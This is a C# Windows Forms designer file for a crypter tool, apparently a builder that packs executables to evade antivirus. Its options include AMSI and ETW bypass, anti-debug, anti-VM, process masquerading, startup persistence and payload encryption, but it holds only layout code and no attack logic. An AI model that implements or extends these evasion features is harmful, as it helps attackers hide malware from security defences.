namespace Crypter.Forms
{
    partial class FrmCrypter
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(FrmCrypter));
            this.inputfile = new System.Windows.Forms.TextBox();
            this.button1 = new System.Windows.Forms.Button();
            this.groupBox1 = new System.Windows.Forms.GroupBox();
            this.processMasquerading = new System.Windows.Forms.CheckBox();
            this.armdotObfuscation = new System.Windows.Forms.CheckBox();
            this.polymorphicAes = new System.Windows.Forms.CheckBox();
            this.startup = new System.Windows.Forms.CheckBox();
            this.runas = new System.Windows.Forms.CheckBox();
            this.obfuscator = new System.Windows.Forms.CheckBox();
            this.etwBypass = new System.Windows.Forms.CheckBox();
            this.amsiBypass = new System.Windows.Forms.CheckBox();
            this.antiDebug = new System.Windows.Forms.CheckBox();
            this.antiVM = new System.Windows.Forms.CheckBox();
            this.groupBox2 = new System.Windows.Forms.GroupBox();
            this.xor = new System.Windows.Forms.RadioButton();
            this.aes = new System.Windows.Forms.RadioButton();
            this.aes256 = new System.Windows.Forms.RadioButton();
            this.button2 = new System.Windows.Forms.Button();
            this.pictureBox2 = new System.Windows.Forms.PictureBox();
            this.pictureBox1 = new System.Windows.Forms.PictureBox();
            this.groupBox1.SuspendLayout();
            this.groupBox2.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox2)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).BeginInit();
            this.SuspendLayout();
            // 
            // inputfile
            // 
            this.inputfile.BackColor = System.Drawing.Color.Black;
            this.inputfile.Location = new System.Drawing.Point(64, 156);
            this.inputfile.Margin = new System.Windows.Forms.Padding(6);
            this.inputfile.Name = "inputfile";
            this.inputfile.Size = new System.Drawing.Size(526, 31);
            this.inputfile.TabIndex = 0;
            // 
            // button1
            // 
            this.button1.BackColor = System.Drawing.Color.Black;
            this.button1.Location = new System.Drawing.Point(602, 156);
            this.button1.Margin = new System.Windows.Forms.Padding(6);
            this.button1.Name = "button1";
            this.button1.Size = new System.Drawing.Size(130, 38);
            this.button1.TabIndex = 1;
            this.button1.Text = "...";
            this.button1.UseVisualStyleBackColor = false;
            this.button1.Click += new System.EventHandler(this.button1_Click);
            // 
            // groupBox1
            // 
            this.groupBox1.Controls.Add(this.processMasquerading);
            this.groupBox1.Controls.Add(this.armdotObfuscation);
            this.groupBox1.Controls.Add(this.polymorphicAes);
            this.groupBox1.Controls.Add(this.startup);
            this.groupBox1.Controls.Add(this.runas);
            this.groupBox1.Controls.Add(this.obfuscator);
            this.groupBox1.Controls.Add(this.etwBypass);
            this.groupBox1.Controls.Add(this.amsiBypass);
            this.groupBox1.Controls.Add(this.antiDebug);
            this.groupBox1.Controls.Add(this.antiVM);
            this.groupBox1.Location = new System.Drawing.Point(64, 196);
            this.groupBox1.Margin = new System.Windows.Forms.Padding(6);
            this.groupBox1.Name = "groupBox1";
            this.groupBox1.Padding = new System.Windows.Forms.Padding(6);
            this.groupBox1.Size = new System.Drawing.Size(668, 192);
            this.groupBox1.TabIndex = 2;
            this.groupBox1.TabStop = false;
            this.groupBox1.Text = "Options";
            // 
            // processMasquerading
            // 
            this.processMasquerading.AutoSize = true;
            this.processMasquerading.ForeColor = System.Drawing.Color.Lime;
            this.processMasquerading.Location = new System.Drawing.Point(402, 123);
            this.processMasquerading.Margin = new System.Windows.Forms.Padding(6);
            this.processMasquerading.Name = "processMasquerading";
            this.processMasquerading.Size = new System.Drawing.Size(265, 29);
            this.processMasquerading.TabIndex = 8;
            this.processMasquerading.Text = "Process Masquerading";
            this.processMasquerading.UseVisualStyleBackColor = true;
            // 
            // armdotObfuscation
            // 
            this.armdotObfuscation.AutoSize = true;
            this.armdotObfuscation.Font = new System.Drawing.Font("Microsoft Sans Serif", 7.875F, System.Drawing.FontStyle.Strikeout, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.armdotObfuscation.ForeColor = System.Drawing.Color.Lime;
            this.armdotObfuscation.Location = new System.Drawing.Point(453, 81);
            this.armdotObfuscation.Margin = new System.Windows.Forms.Padding(6);
            this.armdotObfuscation.Name = "armdotObfuscation";
            this.armdotObfuscation.Size = new System.Drawing.Size(215, 29);
            this.armdotObfuscation.TabIndex = 7;
            this.armdotObfuscation.Text = "Armdot Protection";
            this.armdotObfuscation.UseVisualStyleBackColor = true;
            // 
            // polymorphicAes
            // 
            this.polymorphicAes.AutoSize = true;
            this.polymorphicAes.ForeColor = System.Drawing.Color.Lime;
            this.polymorphicAes.Location = new System.Drawing.Point(24, 163);
            this.polymorphicAes.Margin = new System.Windows.Forms.Padding(6);
            this.polymorphicAes.Name = "polymorphicAes";
            this.polymorphicAes.Size = new System.Drawing.Size(287, 29);
            this.polymorphicAes.TabIndex = 6;
            this.polymorphicAes.Text = "Polymorphism (AES only)";
            this.polymorphicAes.UseVisualStyleBackColor = true;
            // 
            // startup
            // 
            this.startup.AutoSize = true;
            this.startup.ForeColor = System.Drawing.Color.Lime;
            this.startup.Location = new System.Drawing.Point(514, 42);
            this.startup.Margin = new System.Windows.Forms.Padding(6);
            this.startup.Name = "startup";
            this.startup.Size = new System.Drawing.Size(113, 29);
            this.startup.TabIndex = 5;
            this.startup.Text = "Startup";
            this.startup.UseVisualStyleBackColor = true;
            // 
            // runas
            // 
            this.runas.AutoSize = true;
            this.runas.ForeColor = System.Drawing.Color.Lime;
            this.runas.Location = new System.Drawing.Point(214, 122);
            this.runas.Margin = new System.Windows.Forms.Padding(6);
            this.runas.Name = "runas";
            this.runas.Size = new System.Drawing.Size(176, 29);
            this.runas.TabIndex = 4;
            this.runas.Text = "Run as admin";
            this.runas.UseVisualStyleBackColor = true;
            // 
            // obfuscator
            // 
            this.obfuscator.AutoSize = true;
            this.obfuscator.ForeColor = System.Drawing.Color.Lime;
            this.obfuscator.Location = new System.Drawing.Point(248, 81);
            this.obfuscator.Margin = new System.Windows.Forms.Padding(6);
            this.obfuscator.Name = "obfuscator";
            this.obfuscator.Size = new System.Drawing.Size(159, 29);
            this.obfuscator.TabIndex = 3;
            this.obfuscator.Text = "Obfuscation";
            this.obfuscator.UseVisualStyleBackColor = true;
            // 
            // etwBypass
            // 
            this.etwBypass.AutoSize = true;
            this.etwBypass.ForeColor = System.Drawing.Color.Lime;
            this.etwBypass.Location = new System.Drawing.Point(248, 42);
            this.etwBypass.Margin = new System.Windows.Forms.Padding(6);
            this.etwBypass.Name = "etwBypass";
            this.etwBypass.Size = new System.Drawing.Size(229, 29);
            this.etwBypass.TabIndex = 3;
            this.etwBypass.Text = "ETW Bypass/Patch";
            this.etwBypass.UseVisualStyleBackColor = true;
            // 
            // amsiBypass
            // 
            this.amsiBypass.AutoSize = true;
            this.amsiBypass.ForeColor = System.Drawing.Color.Lime;
            this.amsiBypass.Location = new System.Drawing.Point(24, 123);
            this.amsiBypass.Margin = new System.Windows.Forms.Padding(6);
            this.amsiBypass.Name = "amsiBypass";
            this.amsiBypass.Size = new System.Drawing.Size(172, 29);
            this.amsiBypass.TabIndex = 3;
            this.amsiBypass.Text = "AMSI Bypass";
            this.amsiBypass.UseVisualStyleBackColor = true;
            // 
            // antiDebug
            // 
            this.antiDebug.AutoSize = true;
            this.antiDebug.ForeColor = System.Drawing.Color.Lime;
            this.antiDebug.Location = new System.Drawing.Point(24, 81);
            this.antiDebug.Margin = new System.Windows.Forms.Padding(6);
            this.antiDebug.Name = "antiDebug";
            this.antiDebug.Size = new System.Drawing.Size(151, 29);
            this.antiDebug.TabIndex = 1;
            this.antiDebug.Text = "Anti-Debug";
            this.antiDebug.UseVisualStyleBackColor = true;
            // 
            // antiVM
            // 
            this.antiVM.AutoSize = true;
            this.antiVM.Font = new System.Drawing.Font("Microsoft Sans Serif", 7.875F, System.Drawing.FontStyle.Strikeout, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.antiVM.ForeColor = System.Drawing.Color.Lime;
            this.antiVM.Location = new System.Drawing.Point(24, 42);
            this.antiVM.Margin = new System.Windows.Forms.Padding(6);
            this.antiVM.Name = "antiVM";
            this.antiVM.Size = new System.Drawing.Size(211, 29);
            this.antiVM.TabIndex = 0;
            this.antiVM.Text = "Anti-VM [BROKE]";
            this.antiVM.UseVisualStyleBackColor = true;
            // 
            // groupBox2
            // 
            this.groupBox2.Controls.Add(this.xor);
            this.groupBox2.Controls.Add(this.aes);
            this.groupBox2.Controls.Add(this.aes256);
            this.groupBox2.Location = new System.Drawing.Point(64, 400);
            this.groupBox2.Margin = new System.Windows.Forms.Padding(6);
            this.groupBox2.Name = "groupBox2";
            this.groupBox2.Padding = new System.Windows.Forms.Padding(6);
            this.groupBox2.Size = new System.Drawing.Size(668, 113);
            this.groupBox2.TabIndex = 4;
            this.groupBox2.TabStop = false;
            this.groupBox2.Text = "Protection";
            // 
            // xor
            // 
            this.xor.AutoSize = true;
            this.xor.ForeColor = System.Drawing.Color.Lime;
            this.xor.Location = new System.Drawing.Point(514, 46);
            this.xor.Margin = new System.Windows.Forms.Padding(6);
            this.xor.Name = "xor";
            this.xor.Size = new System.Drawing.Size(88, 29);
            this.xor.TabIndex = 2;
            this.xor.Text = "XOR";
            this.xor.UseVisualStyleBackColor = true;
            // 
            // aes
            // 
            this.aes.AutoSize = true;
            this.aes.ForeColor = System.Drawing.Color.Lime;
            this.aes.Location = new System.Drawing.Point(276, 46);
            this.aes.Margin = new System.Windows.Forms.Padding(6);
            this.aes.Name = "aes";
            this.aes.Size = new System.Drawing.Size(85, 29);
            this.aes.TabIndex = 1;
            this.aes.Text = "AES";
            this.aes.UseVisualStyleBackColor = true;
            // 
            // aes256
            // 
            this.aes256.AutoSize = true;
            this.aes256.Checked = true;
            this.aes256.ForeColor = System.Drawing.Color.Lime;
            this.aes256.Location = new System.Drawing.Point(32, 46);
            this.aes256.Margin = new System.Windows.Forms.Padding(6);
            this.aes256.Name = "aes256";
            this.aes256.Size = new System.Drawing.Size(116, 29);
            this.aes256.TabIndex = 0;
            this.aes256.TabStop = true;
            this.aes256.Text = "Base64";
            this.aes256.UseVisualStyleBackColor = true;
            // 
            // button2
            // 
            this.button2.BackColor = System.Drawing.Color.Black;
            this.button2.ForeColor = System.Drawing.Color.Lime;
            this.button2.Location = new System.Drawing.Point(64, 525);
            this.button2.Margin = new System.Windows.Forms.Padding(6);
            this.button2.Name = "button2";
            this.button2.Size = new System.Drawing.Size(668, 71);
            this.button2.TabIndex = 5;
            this.button2.Text = "Build";
            this.button2.UseVisualStyleBackColor = false;
            this.button2.Click += new System.EventHandler(this.button2_Click);
            // 
            // pictureBox2
            // 
            this.pictureBox2.BackgroundImage = global::Crypter.Properties.Resources.photo_2025_05_30_21_32_58;
            this.pictureBox2.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
            this.pictureBox2.Location = new System.Drawing.Point(655, 12);
            this.pictureBox2.Name = "pictureBox2";
            this.pictureBox2.Size = new System.Drawing.Size(130, 135);
            this.pictureBox2.TabIndex = 7;
            this.pictureBox2.TabStop = false;
            // 
            // pictureBox1
            // 
            this.pictureBox1.BackgroundImage = global::Crypter.Properties.Resources.photo_2025_05_31_23_40_54;
            this.pictureBox1.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
            this.pictureBox1.Location = new System.Drawing.Point(12, 12);
            this.pictureBox1.Name = "pictureBox1";
            this.pictureBox1.Size = new System.Drawing.Size(130, 135);
            this.pictureBox1.TabIndex = 6;
            this.pictureBox1.TabStop = false;
            // 
            // FrmCrypter
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(12F, 25F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(30)))), ((int)(((byte)(30)))));
            this.ClientSize = new System.Drawing.Size(797, 611);
            this.Controls.Add(this.pictureBox2);
            this.Controls.Add(this.pictureBox1);
            this.Controls.Add(this.button2);
            this.Controls.Add(this.groupBox2);
            this.Controls.Add(this.groupBox1);
            this.Controls.Add(this.button1);
            this.Controls.Add(this.inputfile);
            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
            this.Margin = new System.Windows.Forms.Padding(6);
            this.Name = "FrmCrypter";
            this.Text = "Skrypter [ALPHA] @SkeemLabs";
            this.Load += new System.EventHandler(this.FrmCrypter_Load);
            this.groupBox1.ResumeLayout(false);
            this.groupBox1.PerformLayout();
            this.groupBox2.ResumeLayout(false);
            this.groupBox2.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox2)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).EndInit();
            this.ResumeLayout(false);
            this.PerformLayout();

        }

        #endregion

        private System.Windows.Forms.TextBox inputfile;
        private System.Windows.Forms.Button button1;
        private System.Windows.Forms.GroupBox groupBox1;
        private System.Windows.Forms.CheckBox antiDebug;
        private System.Windows.Forms.CheckBox antiVM;
        private System.Windows.Forms.CheckBox amsiBypass;
        private System.Windows.Forms.CheckBox etwBypass;
        private System.Windows.Forms.CheckBox obfuscator;
        private System.Windows.Forms.GroupBox groupBox2;
        private System.Windows.Forms.RadioButton aes256;
        private System.Windows.Forms.Button button2;
        private System.Windows.Forms.CheckBox runas;
        private System.Windows.Forms.CheckBox startup;
        private System.Windows.Forms.RadioButton xor;
        private System.Windows.Forms.RadioButton aes;
        private System.Windows.Forms.CheckBox polymorphicAes;
        private System.Windows.Forms.CheckBox armdotObfuscation;
        private System.Windows.Forms.CheckBox processMasquerading;
        private System.Windows.Forms.PictureBox pictureBox1;
        private System.Windows.Forms.PictureBox pictureBox2;
    }
}